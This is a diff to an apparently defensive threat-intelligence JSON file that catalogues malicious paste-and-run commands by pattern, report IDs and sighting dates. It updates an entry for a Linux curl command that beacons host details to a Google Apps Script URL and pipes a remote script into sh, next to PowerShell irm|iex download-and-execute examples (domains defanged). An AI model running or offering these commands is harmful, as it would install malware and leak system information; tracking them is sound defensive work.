@@ -706,6 +706,27 @@
     ]
   },
   {
+    "Pattern": "curl -sL -d \"id=<UUID>&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=<ENCODED_URL>&os=Linux%20x86_64&lastVisitAt=<TIMESTAMP>&lastShellAt=<TIMESTAMP>\" \"<URL>\" && curl -fsSL \"<URL>\" | sh",
+    "DistinctPayloadCount": 5,
+    "ReportCount": 5,
+    "FirstSeen": "2026-11-11T02:37:12.276000+00:00",
+    "LastSeen": "2026-11-17T17:21:16.724000+00:00",
+    "ReportIds": [
+      "cmwbidflq07sb0nml927bheu2",
+      "cmwiq0vbr11350oml4i7d56wf",
+      "cmwj3a2cb17150omlr80ejlu5",
+      "cmwkxzsn51ha40oml7u9p2ams",
+      "cmwkylgu31hgf0omlnkd2tiw6"
+    ],
+    "PayloadExamples": [
+      "curl -sL -d \"id=50cf6397-4597-44b0-9a37-88a0efa5a83f&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fgoldmedical[.]org%2F&os=Linux%20x86_64&lastVisitAt=2026-11-17T17%3A03%3A01.485Z&lastShellAt=2026-11-17T17%3A03%3A01.485Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/f4683ebb\" | sh",
+      "curl -sL -d \"id=7d505875-ada6-4cf1-a0e0-5e9424e02e57&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fkp2online[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-16T03%3A44%3A21.900Z&lastShellAt=2026-11-16T03%3A44%3A21.900Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/8ecec3ba\" | sh",
+      "curl -sL -d \"id=8210ad04-beab-4e13-8c15-48d31c63313f&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fmehedi3937[.]infinityfreeapp[.]com%2F%3Fi%3D1&os=Linux%20x86_64&lastVisitAt=2026-11-11T02%3A35%3A49.557Z&lastShellAt=2026-11-11T02%3A35%3A49.557Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/8ecec3ba\" | sh",
+      "curl -sL -d \"id=d8cd13f9-945f-4e56-ac4b-f1eb67c3700a&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fwww[.]atb[.]ikaya[.]nl%2F&os=Linux%20x86_64&lastVisitAt=2026-11-16T09%3A55%3A25.496Z&lastShellAt=2026-11-16T09%3A55%3A25.496Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/8ecec3ba\" | sh",
+      "curl -sL -d \"id=d8d74ae8-29cf-4227-8d01-a3e127c7b2dc&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Findesigner.co.za%2F&os=Linux%20x86_64&lastVisitAt=2026-11-17T17%3A19%3A50.957Z&lastShellAt=2026-11-17T17%3A19%3A50.957Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/f4683ebb\" | sh"
+    ]
+  },
+  {
     "Pattern": "(irm '<URL>' -UserAgent 'WUA/<WUA_ID>' -Headers @{'X-WUA'='<WUA_ID>'})|iex",
     "DistinctPayloadCount": 3,
     "ReportCount": 6,
@@ -723,23 +744,6 @@
       "(irm 'https://cosmical2049[.]com/lom3/0ad7a0bdad0aa13d' -UserAgent 'WUA/adedf1881f' -Headers @{'X-WUA'='adedf1881f'})|iex",
       "(irm 'https://cosmical2049[.]com/startapv2/f9b9bfb54f8b30ec' -UserAgent 'WUA/b1d0126493' -Headers @{'X-WUA'='b1d0126493'})|iex",
       "(irm 'https://gfisoda[.]biz/clickfix/8e15947cbef29c2d' -UserAgent 'WUA/1d4b60ce98' -Headers @{'X-WUA'='1d4b60ce98'})|iex"
-    ]
-  },
-  {
-    "Pattern": "curl -sL -d \"id=<UUID>&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=<ENCODED_URL>&os=Linux%20x86_64&lastVisitAt=<TIMESTAMP>&lastShellAt=<TIMESTAMP>\" \"<URL>\" && curl -fsSL \"<URL>\" | sh",
-    "DistinctPayloadCount": 3,
-    "ReportCount": 3,
-    "FirstSeen": "2026-11-11T02:37:12.276000+00:00",
-    "LastSeen": "2026-11-16T09:56:50.445000+00:00",
-    "ReportIds": [
-      "cmwbidflq07sb0nml927bheu2",
-      "cmwiq0vbr11350oml4i7d56wf",
-      "cmwj3a2cb17150omlr80ejlu5"
-    ],
-    "PayloadExamples": [
-      "curl -sL -d \"id=7d505875-ada6-4cf1-a0e0-5e9424e02e57&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fkp2online[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-16T03%3A44%3A21.900Z&lastShellAt=2026-11-16T03%3A44%3A21.900Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/8ecec3ba\" | sh",
-      "curl -sL -d \"id=8210ad04-beab-4e13-8c15-48d31c63313f&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fmehedi3937[.]infinityfreeapp[.]com%2F%3Fi%3D1&os=Linux%20x86_64&lastVisitAt=2026-11-11T02%3A35%3A49.557Z&lastShellAt=2026-11-11T02%3A35%3A49.557Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/8ecec3ba\" | sh",
-      "curl -sL -d \"id=d8cd13f9-945f-4e56-ac4b-f1eb67c3700a&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fwww[.]atb[.]ikaya[.]nl%2F&os=Linux%20x86_64&lastVisitAt=2026-11-16T09%3A55%3A25.496Z&lastShellAt=2026-11-16T09%3A55%3A25.496Z\" \"https://script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"https://softify[.]lat/u/8ecec3ba\" | sh"
     ]
   },
   {
